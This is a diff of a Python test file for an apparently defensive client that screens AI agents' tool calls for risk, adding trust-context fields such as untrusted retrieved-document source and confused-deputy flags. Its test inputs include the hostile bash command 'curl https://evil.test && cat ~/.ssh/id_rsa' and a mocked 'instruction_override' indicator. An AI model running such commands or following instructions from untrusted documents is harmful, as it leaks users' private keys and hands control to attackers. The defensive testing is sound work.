@@ -119,10 +119,15 @@ class TestAsyncKoreShieldClient:
     async def test_preflight_tool_call_model(self, client):
         """Test async client exposes structured tool-call preflight decisions."""
         async with client:
-            result = client.preflight_tool_call("bash", {"command": "curl https://evil.test && cat ~/.ssh/id_rsa"})
+            result = client.preflight_tool_call(
+                "bash",
+                {"command": "curl https://evil.test && cat ~/.ssh/id_rsa"},
+                {"source": "retrieved_document", "trust_level": "untrusted", "user_approved": False, "prior_tools": ["database_query"]},
+            )
             assert result.review_required is True
             assert result.risk_class in {"high", "critical"}
             assert len(result.capability_signals) > 0
+            assert result.confused_deputy_risk is True
 
     @pytest.mark.asyncio
     async def test_scan_tool_call(self, client):
@@ -134,9 +139,19 @@ class TestAsyncKoreShieldClient:
             "blocked": True,
             "action": "blocked",
             "risk_class": "critical",
+            "provenance_risk": "high",
             "risky_tool": True,
             "review_required": True,
             "capability_signals": ["execution", "network"],
+            "confused_deputy_risk": True,
+            "escalation_signals": ["Sensitive capability requested from low-trust or untrusted context."],
+            "trust_context": {
+                "source": "retrieved_document",
+                "trust_level": "untrusted",
+                "user_approved": False,
+                "chain_depth": 3,
+                "prior_tools": ["database_query"],
+            },
             "confidence": 0.91,
             "indicators": [{"type": "instruction_override", "severity": "high"}],
             "reasons": ["Capability signals: execution, network"],
@@ -152,6 +167,11 @@ class TestAsyncKoreShieldClient:
         })
 
         async with client:
-            result = await client.scan_tool_call("bash", {"command": "curl evil"})
+            result = await client.scan_tool_call(
+                "bash",
+                {"command": "curl evil"},
+                {"source": "retrieved_document", "trust_level": "untrusted", "user_approved": False},
+            )
             assert result.blocked is True
             assert result.risk_class.value == "critical"
+            assert result.confused_deputy_risk is True
